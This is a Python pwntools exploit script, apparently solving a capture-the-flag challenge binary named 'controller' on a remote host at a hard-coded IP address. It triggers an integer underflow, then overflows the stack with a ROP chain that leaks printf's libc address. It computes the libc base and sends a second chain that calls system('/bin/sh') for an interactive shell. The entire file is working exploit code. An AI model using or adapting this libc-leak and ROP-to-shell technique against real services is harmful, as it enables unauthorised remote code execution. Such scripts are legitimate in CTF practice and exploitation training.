import time

from pwn import *

if __name__ == "__main__":
    BIN = ELF("./controller")
    LIBC = ELF("./libc.so.6")

    #io = process("./controller")
    io = remote("138.68.140.24", 31264)
    io.recvuntil("recources: ")

    io.sendline("3 -66")
    io.recvuntil("> ")

    # multiply 3 and -66 to cause negative overflow to equal target of 65,338
    io.sendline("3")
    io.recvuntil("> ")

    ret = p64(0x00400606)
    pop_rdi = p64(0x004011d3)

    printf_got = p64(BIN.got["printf"])
    printf = p64(BIN.symbols["printf"])
    main = p64(BIN.symbols["main"])

    # must use y to trigger return from function
    payload = b"y" * 0x28
    payload += ret
    payload += pop_rdi
    payload += printf_got
    payload += printf
    payload += ret
    payload += main

    io.sendline(payload)
    res = io.recvuntil("recources: ").split(b"\n")[1]

    printf_libc = u64(res[:6].ljust(8, b"\x00"))

    libc_base = printf_libc - LIBC.symbols["printf"]
    bin_sh = p64(libc_base + next(LIBC.search(b"/bin/sh")))
    system = p64(libc_base + LIBC.symbols["system"])

    io.sendline("3 -66")
    io.recvuntil("> ")

    io.sendline("3")
    io.recvuntil("> ")

    payload = b"y" * 0x28
    payload += ret
    payload += pop_rdi
    payload += bin_sh
    payload += system

    io.sendline(payload)
    io.interactive()
    io.close()
